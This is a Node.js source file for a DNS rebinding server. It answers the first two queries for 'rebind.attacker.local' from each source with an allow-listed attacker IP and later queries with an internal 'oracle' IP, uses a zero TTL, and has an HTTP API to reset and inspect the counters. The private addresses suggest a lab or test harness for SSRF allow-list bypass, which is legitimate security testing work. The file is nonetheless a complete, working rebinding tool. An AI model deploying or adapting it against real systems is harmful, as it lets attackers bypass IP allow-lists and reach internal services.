import dns2 from 'dns2';
import dns from 'dns';
import { promisify } from 'util';
import express from 'express';

const { Packet } = dns2;

// ── Constants ──────────────────────────────────────────────────────────────────
const ATTACKER_IP   = '10.99.0.10';   // attacker-controlled / allow-listed IP
const ORACLE_IP     = '10.99.0.100';  // internal oracle target
const REBIND_DOMAIN = 'rebind.attacker.local';
const REBIND_THRESHOLD = 2;            // first N queries get attacker IP, rest get oracle IP
const TTL = 0;                         // force re-resolution on every query

// ── State ──────────────────────────────────────────────────────────────────────
// Map<sourceIP, queryCount>
const rebindCounters = new Map();

// ── DNS helpers ────────────────────────────────────────────────────────────────
const resolve4 = promisify(dns.resolve4);

/**
 * Return the IP that should be handed back for a rebind query from `sourceIP`.
 * Increments the counter each call.
 */
function rebindAnswer(sourceIP) {
  const count = (rebindCounters.get(sourceIP) ?? 0) + 1;
  rebindCounters.set(sourceIP, count);
  return count <= REBIND_THRESHOLD ? ATTACKER_IP : ORACLE_IP;
}

/**
 * Build a minimal A-record response packet.
 */
function buildAResponse(request, name, address) {
  const response = Packet.createResponseFromRequest(request);
  response.answers.push({
    name,
    type:    Packet.TYPE.A,
    class:   Packet.CLASS.IN,
    ttl:     TTL,
    address,
  });
  return response;
}

// ── DNS Server (UDP :53) ───────────────────────────────────────────────────────
const dnsServer = dns2.createServer({
  udp: true,

  handle: async (request, send, rinfo) => {
    const response = Packet.createResponseFromRequest(request);
    const sourceIP = rinfo.address;

    for (const question of request.questions) {
      if (question.type !== Packet.TYPE.A) {
        // Non-A queries: pass through without answering (NXDOMAIN-ish)
        continue;
      }

      const name = question.name.toLowerCase();

      // ── Static: attacker.local ─────────────────────────────────────────────
      if (name === 'attacker.local' || name.endsWith('.attacker.local')) {

        // ── Rebind: rebind.attacker.local ──────────────────────────────────
        if (name === REBIND_DOMAIN) {
          const ip = rebindAnswer(sourceIP);
          console.log(`[DNS] REBIND  ${name} from ${sourceIP} → ${ip} (count=${rebindCounters.get(sourceIP)})`);
          response.answers.push({
            name,
            type:    Packet.TYPE.A,
            class:   Packet.CLASS.IN,
            ttl:     TTL,
            address: ip,
          });
          continue;
        }

        // ── Wildcard *.attacker.local or attacker.local itself ─────────────
        console.log(`[DNS] STATIC  ${name} → ${ATTACKER_IP}`);
        response.answers.push({
          name,
          type:    Packet.TYPE.A,
          class:   Packet.CLASS.IN,
          ttl:     TTL,
          address: ATTACKER_IP,
        });
        continue;
      }

      // ── Static: oracle.internal ────────────────────────────────────────────
      if (name === 'oracle.internal') {
        console.log(`[DNS] STATIC  ${name} → ${ORACLE_IP}`);
        response.answers.push({
          name,
          type:    Packet.TYPE.A,
          class:   Packet.CLASS.IN,
          ttl:     TTL,
          address: ORACLE_IP,
        });
        continue;
      }

      // ── Fallback: forward to 8.8.8.8 ──────────────────────────────────────
      try {
        console.log(`[DNS] FORWARD ${name} → 8.8.8.8`);
        const addresses = await resolve4(name);
        for (const address of addresses) {
          response.answers.push({
            name,
            type:    Packet.TYPE.A,
            class:   Packet.CLASS.IN,
            ttl:     TTL,
            address,
          });
        }
      } catch (err) {
        // NXDOMAIN or lookup failure — return empty answer section
        console.log(`[DNS] NXDOMAIN ${name}: ${err.message}`);
      }
    }

    send(response);
  },
});

dnsServer.on('error', (err) => {
  console.error('[DNS] Server error:', err);
});

dnsServer.listen({ udp: { port: 53, address: '0.0.0.0' } });
console.log('[DNS] Listening on UDP :53');

// ── HTTP Control API (port 5353) ───────────────────────────────────────────────
const app = express();
app.use(express.json());

// POST /rebind/reset — wipe all per-source counters
app.post('/rebind/reset', (_req, res) => {
  rebindCounters.clear();
  console.log('[HTTP] /rebind/reset — counters cleared');
  res.json({ reset: true });
});

// GET /rebind/status — dump current counter map
app.get('/rebind/status', (_req, res) => {
  const status = Object.fromEntries(rebindCounters);
  res.json(status);
});

// GET /health
app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

app.listen(5353, '0.0.0.0', () => {
  console.log('[HTTP] Control API listening on :5353');
});
